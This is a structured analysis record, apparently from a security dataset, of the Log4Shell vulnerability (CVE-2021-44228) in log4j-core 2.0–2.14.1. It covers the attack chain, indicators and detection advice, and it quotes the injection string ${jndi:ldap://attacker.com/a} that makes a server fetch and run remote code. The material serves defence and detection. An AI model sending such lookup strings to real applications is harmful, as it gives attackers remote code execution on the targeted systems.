package_info.why_malicious: The package contains a feature (JNDI message lookup substitution) that, when enabled, allows attackers to trigger remote code execution by injecting specially crafted log messages. This behavior is not intended for malicious use, but the default configuration and lack of input sanitization make it trivially exploitable, resulting in a critical security vulnerability (CVE-2021-44228, 'Log4Shell').

execution_context.trigger: At runtime, when a log message is processed by Log4j
required_permissions: filesystem (for class loading and potential payload storage)
JVM class loading (to load remote classes)

malicious_snippets.code_language: Java (log message string processed by Log4j)
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates an outbound LDAP request to attacker.com, retrieves a remote Java class, and loads it into the JVM, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load executable code from remote servers, creating a direct remote code execution vector.
malice_analysis.violated_expectations: Logging frameworks are expected to record messages passively and never execute code or perform network requests based on log content. Executing code or making network calls from log message content is a severe violation of standard logging behavior.
malice_analysis.similar_legitimate_use: JNDI lookups can be used for dynamic configuration or resource resolution in trusted, internal environments, but should never be exposed to untrusted user input or used in log message processing.
key_indicators: Presence of JNDI lookup patterns (e.g., ${jndi:ldap://...}) in log messages
Outbound LDAP or RMI network requests initiated during log processing
Dynamic loading of Java classes from remote sources triggered by log content
Lack of input sanitization or security policy enforcement in message lookup feature

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the message and initiates a remote LDAP request.

attack_chain.action: Log4j's JndiLookup feature performs a network request to the attacker-controlled LDAP server.
attack_chain.leads_to: Retrieval of a malicious Java class file from the attacker's server.

attack_chain.action: The malicious Java class is loaded and executed within the JVM, granting the attacker remote code execution on the target system.
attack_chain.leads_to: Full system compromise, malware installation, data exfiltration, or further lateral movement.

behavioral_signatures: Log messages containing JNDI lookup patterns (e.g., ${jndi:ldap://...}, ${jndi:rmi://...})
Unexpected outbound LDAP or RMI network requests from application servers during log processing
Dynamic loading of Java classes from remote sources triggered by log message content
file_indicators: log4j-core versions between 2.0 and 2.14.1 present in application dependencies
network_indicators: Outbound LDAP or RMI requests to untrusted or external domains/IPs from application servers
Connections to attacker-controlled infrastructure (e.g., attacker.com) immediately following log events
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (such as ${jndi:ldap://}), inspect network traffic for unexpected outbound LDAP/RMI requests from application servers, and audit dependencies for vulnerable log4j-core versions (2.0 to 2.14.1). Use SBOMs to identify affected components. Block or alert on outbound LDAP/RMI traffic from application servers, and scan deployed JARs for the presence of org/apache/logging/log4j/core/lookup/JndiLookup.class.
